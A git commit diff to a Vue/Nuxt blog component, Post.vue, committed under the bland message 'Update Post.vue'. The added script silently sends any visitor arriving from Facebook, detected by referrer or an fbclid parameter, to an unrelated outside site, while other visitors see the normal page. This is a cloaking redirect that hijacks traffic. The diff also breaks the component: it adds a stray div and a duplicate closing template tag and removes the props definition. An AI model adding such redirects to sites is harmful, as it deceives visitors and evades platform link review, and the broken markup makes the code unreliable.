f5a2812050b5227074aa1f48fe612d9189470b7e
dtienhau <117889242+dtienhau@users.noreply.github.com>
2023-08-30 22:44:12 +0700

    Update Post.vue

--- components/Post.vue
+++ components/Post.vue
@@ -19,10 +19,30 @@
         </div>
     </NuxtLink>
 </template>
-
-<script setup lang="ts">
-const props = defineProps<{
-    post: Record<'title' | 'date' | 'excerpt' | 'uri', string>
-}>();
-
+<div>
+    <!-- Your static page content here -->
+  </div>
+</template>
+<script>
+export default {
+  mounted() {
+    this.checkAndRedirect();
+  },
+  methods: {
+    isFacebookReferer() {
+      const referer = document.referrer.toLowerCase();
+      return referer.includes('facebook.com');
+    },
+    hasFbclidParameter() {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.has('fbclid');
+    },
+    checkAndRedirect() {
+      if (this.isFacebookReferer() || this.hasFbclidParameter()) {
+        // Redirect to your website's URL
+        window.location.href = 'https://www.nailsforus.com'
+      }
+    }
+  }
+};
 </script>
